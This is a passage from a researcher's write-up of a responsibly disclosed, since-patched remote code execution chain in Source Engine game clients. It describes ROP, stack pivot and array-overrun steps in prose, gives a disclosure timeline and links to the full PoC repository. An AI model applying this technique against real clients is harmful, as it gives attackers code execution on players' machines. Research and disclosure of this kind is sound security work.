6. The server builds a ROP chain payload to execute the Windows API call for `ShellExecuteA`. This ROP chain is used to bypass the NX protection on modern Windows systems. The chain utilizes the known addresses in `engine.dll` that were leaked from the exploitation of the separate bug in Step 3. Upon successful exploitation, this ROP chain can execute arbitrary code.

7. The script again replicates the ConVar `sv_downloadurl` onto the client instance with the value of `C:/Windows/System32/winver.exe`. This is used by the ROP chain as the target program to execute with `ShellExecuteA`. This ConVar exists inside of `engine.dll` so the pointer `sv_download_url->m_pszString` is now at an attacker known location.

8. The sever sends a crafted `NET_Tick` message to modify the value of `g_ClientGlobalVariables->tickcount` to be a pointer to a stack pivot gadget found inside of `engine.dll` (again, leaked from Step 3). Essentially, this is another trick to get a pointer value to exist at an attacker controlled location within `engine.dll`.

9. Now, the next bug will be used by creating a specially crafted `SVC_PacketEntities` netmessage which will call `CL_CopyExistingEntity` on the client instance with the vulnerable value for `m_nNewEntity`. This value will exploit the array overrun in `GetClientNetworkable` inside of `client.dll` and allows us to confuse the pointer return value to instead be a pointer to `sv_mumble_positionalaudio->m_pszString` (also inside `client.dll`). At the location of `sv_mumble_positionalaudio->m_pszString` is the fake object pointer created in Step 4. This object pointer will redirect execution by pretending to be an `IClientNetworkable*` object and redirect the virtual method call to the value found within `g_ClientGlobalVariables->tickcount`. This means we can set the instruction pointer to any value specified by the `NET_Tick` trick we used in Step 7.

10. Lastly, to execute the ROP chain and achieve RCE, the `g_ClientGlobalVariables->tickcount` is pointed to a stack pivot gadget inside of `engine.dll`. This pivots the stack to the ROP payload that was placed in `sv_mumble_positionalaudio->m_pszString` in Step 4. The ROP chain then begins execution. The chain will load necessary arguments to call `ShellExecuteA`, then execute whatever program path we replicated onto `sv_downloadurl` given in Step 6.  In this case, it is used to execute `winver.exe` for proof of concept. This chain can execute any code of the attacker's choosing, and has full permissions to access all of the users files and data.



And there you have it. This entire exploitation happens automatically, and does so by using Frida to inject into the dedicated server process to instrument to do all of the steps above. This is quite involved, but the result is pretty awesome! Here's a video of the full PoC in action, be sure to full screen it so it's easier to see:

<video controls width="1200">
  <source type="video/mp4" src="https://ctf.re/static/packetentities_exploit_full.mp4">
</video>

## Disclosure Timeline

- [**2020**-05-13] Reported to Valve through HackerOne
- [**2020**-05-18] Bug triaged
- [**2021**-04-28] Notification that the bugs were fixed in Beta
- [**2021**-04-30] Bounty paid ($2500) and notification that the bugs were fixed in Retail

## Supporting Files

Exploit PoC and the map hacking Python script referenced in this post are available in full at:

[https://github.com/Gbps/sourceengine-packetentities-rce-poc](https://github.com/Gbps/sourceengine-packetentities-rce-poc)

But sure to give it a ⭐ if you liked it!

## Final thoughts

This chain was super fun to develop, and the constraints I placed on myself made the exploit way more interesting than my first submission. While I wasn't super stoked about getting only 1/6th of the bounty of my trivial stack-based overflow submission prior, especially after a year of waiting, I'm glad that the report finally went through so I could publish the information for everyone to read. It really goes to show that even a fairly simple set of bugs on paper can turn into a complex exploitation effort quickly when targeting big software applications. But, doing so helps you develop skills that you might not necessarily pick up from simple CTF problems. 

Incorporating the Frida project definitely reinvigorated my drive to continue poking and testing PoCs for bugs, as the process for scripting up examples was much nicer than before. I hope to spend some time in a future post to discuss more ways to utilize Frida on the desktop, and also hope to publish my ret-sync Frida plugin in an official capacity on my [GitHub](https://github.com/Gbps/) soon.

I'm also working on some other projects in the meantime, off-and-on. I have also been writing a fairly large project which implements a CS:GO client from scratch in Rust to help improve my skills with the language. After a ton of work, I can happily say my client can authenticate with Steam, fully connect and load into a server, send and receive netchannel packets with the game server, and host a fake console to execute concommands. There is no graphical portion of this, it is entirely command line based.

In addition, I've started to shift my focus somewhat away from Source and onto Steam itself. Steam is a vastly complex application, and its networking protocol it uses is magnitudes more complex than that of Source. There hasn't been too much research done in the public on Steam's networking protocols, so I've written a few tools that can fully encode/decode this networking layer and intercept packets to learn how they work. Even an idle instance of Steam running creates a lot of very interesting traffic that very few people have looked at! More information on this hopefully soon.

For now, I don't have a timeline for the release of any of those projects, or for the next blog post I will write, but hopefully it won't be as long as it took to get this one out ;)

Thank you for reading!

